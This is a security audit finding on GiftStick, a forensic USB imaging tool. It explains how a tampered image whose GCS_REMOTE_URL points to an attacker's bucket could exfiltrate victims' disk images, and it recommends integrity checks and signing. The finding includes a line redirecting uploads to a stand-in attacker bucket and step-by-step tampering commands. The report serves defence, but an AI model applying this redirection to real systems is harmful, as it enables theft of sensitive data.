### Vulnerability List

- Vulnerability Name: GCS Bucket Destination Manipulation
- Description:
    1. An attacker creates a modified GiftStick USB drive, starting from a legitimate GiftStick image.
    2. The attacker mounts the GiftStick image file (e.g., `giftstick.img`).
    3. Within the mounted image, the attacker navigates to the user's home directory (e.g., `/mnt/upper/home/xubuntu/`).
    4. The attacker modifies the `call_auto_forensicate.sh` script.
    5. Inside `call_auto_forensicate.sh`, the attacker changes the `GCS_REMOTE_URL` variable to point to a GCS bucket under their control (e.g., `gs://attacker-bucket/evil_evidence/`). Alternatively, they could modify the command-line arguments passed to `auto_forensicate.py` to change the destination URL.
    6. The attacker unmounts the modified GiftStick image.
    7. The attacker then uses social engineering to trick a victim into booting a target system with this malicious GiftStick.
    8. When the target system boots from the malicious GiftStick, `call_auto_forensicate.sh` is executed.
    9. The `auto_forensicate.py` script, as called by the modified `call_auto_forensicate.sh`, uploads the collected forensic evidence to the attacker-specified GCS bucket (`gs://attacker-bucket/evil_evidence/`) instead of the intended secure bucket.
- Impact:
    - Confidentiality breach: Sensitive forensic data collected from the target system, which could include disk images, system information, and firmware, is exfiltrated to a storage location controlled by the attacker.
    - Loss of evidence integrity: The intended recipient of the forensic data does not receive it, hindering legitimate forensic investigation processes.
- Vulnerability Rank: High
- Currently Implemented Mitigations:
    - None. The project currently lacks any implemented mechanisms to prevent modification of the bootable image or to verify the integrity of the scripts within a potentially rogue GiftStick.
- Missing Mitigations:
    - **Integrity Checks:** Implement integrity checks for critical scripts like `call_auto_forensicate.sh` and `auto_acquire.py` within the GiftStick image. This could involve checksums or cryptographic hashes to detect unauthorized modifications.
    - **Digital Signatures:** Digitally sign the GiftStick image. This would allow users to verify the authenticity and integrity of the GiftStick before use, ensuring it hasn't been tampered with.
    - **Read-Only File System:** Mount the partition containing critical scripts as read-only in the bootable image. This would prevent attackers from easily modifying these scripts post-image creation.
- Preconditions:
    - An attacker must be able to create a modified GiftStick image. This requires technical skills to modify ISO images and potentially some understanding of Linux systems.
    - The attacker must successfully employ social engineering to convince a user to boot a target system using the malicious GiftStick. This is the primary attack vector as described in the project documentation.
- Source Code Analysis:
    - `tools/remaster_scripts/call_auto_forensicate.sh`:
        ```bash
        #!/bin/bash
        # ...
        source config.sh
        # ...
        sudo "${AUTO_FORENSIC_SCRIPT_NAME}" \
          --gs_keyfile="${GCS_SA_KEY_FILE}" \
          --logging stdout \
          --logging stackdriver \
          --log_progress \
          --acquire all \
          ${EXTRA_OPTIONS} "${GCS_REMOTE_URL}/"
        ```
        This script directly uses the `GCS_REMOTE_URL` variable sourced from `config.sh` as the destination URL for the `auto_forensicate.py` script. An attacker modifying this script can easily change the destination.
    - `config.sh`:
        ```bash
        AUTO_FORENSIC_SCRIPT_NAME="${AUTO_FORENSIC_SCRIPT_NAME}"
        GCS_SA_KEY_FILE="/home/${GIFT_USERNAME}/${GCS_SA_KEY_NAME}"
        GCS_REMOTE_URL="${GCS_REMOTE_URL}"
        ```
        This file stores configuration variables, including `GCS_REMOTE_URL`. While intended to be configured during the image creation process, it resides within the writable partition of the GiftStick image and is therefore modifiable by an attacker.
    - `auto_forensicate/auto_acquire.py`:
        ```python
        # ...
        parser.add_argument(
            'destination', action='store',
            help=(
                'Sets the destination for uploads. '
                'For example gs://bucket_name/path will upload to GCS in bucket '
                '<bucket_name> in the folder </path/>')
        )
        # ...
        options = parser.parse_args(args)
        # ...
        self._uploader = self._MakeUploader(options)
        ```
        The `auto_acquire.py` script takes the destination URL as a command-line argument (`options.destination`) without any validation against a pre-defined secure destination. This allows the script to upload data to any URL provided, including an attacker's bucket if the URL is modified in the calling script.

- Security Test Case:
    1. **Setup Attacker-Controlled Bucket:** Create a GCS bucket named `attacker-giftstick-bucket` (or any name you control) within your Google Cloud project.
    2. **Create Legitimate GiftStick Image:**
        - Follow the instructions in `README.md` to create a legitimate GiftStick image using `tools/remaster.sh`. Use your own GCP project and a legitimate GCS bucket (e.g., `giftstick-test-bucket`) for testing. Let's assume the generated image is `giftstick.img`.
    3. **Mount GiftStick Image:** Mount the `giftstick.img` image to a temporary mount point (e.g., `/mnt`).
        ```bash
        sudo mount -o loop giftstick.img /mnt
        ```
    4. **Modify `call_auto_forensicate.sh`:**
        - Navigate to the user's home directory in the mounted image: `/mnt/upper/home/xubuntu/`.
        - Edit the `call_auto_forensicate.sh` script using a text editor (e.g., `sudo nano call_auto_forensicate.sh`).
        - Find the line that defines or uses `GCS_REMOTE_URL` or the command that calls `auto_forensicate.py`.
        - Modify the destination URL to your attacker-controlled bucket, `gs://attacker-giftstick-bucket/evil_evidence/`. For example, change the line to:
          ```bash
          GCS_REMOTE_URL="gs://attacker-giftstick-bucket/evil_evidence/"
          ```
        - Save the changes and exit the text editor.
    5. **Unmount GiftStick Image:** Unmount the GiftStick image.
        ```bash
        sudo umount /mnt
        ```
    6. **Boot Target System with Malicious GiftStick:**
        - Prepare a test system (virtual machine or physical machine).
        - Boot the test system from the modified `giftstick.img` USB drive.
        - Allow the GiftStick to boot and the acquisition process to run automatically.
    7. **Verify Data Exfiltration:**
        - After the acquisition process completes (or appears to complete), check the attacker-controlled GCS bucket (`gs://attacker-giftstick-bucket/evil_evidence/`).
        - You should find the forensic evidence files (e.g., `stamp.json`, `system_info.txt`, `Disks/sda.image`, etc.) uploaded to the attacker-controlled bucket, confirming successful data exfiltration.
    8. **Check Intended Bucket (Optional):** Verify that the originally intended legitimate GCS bucket (`giftstick-test-bucket`) does *not* contain the forensic evidence, further confirming the redirection.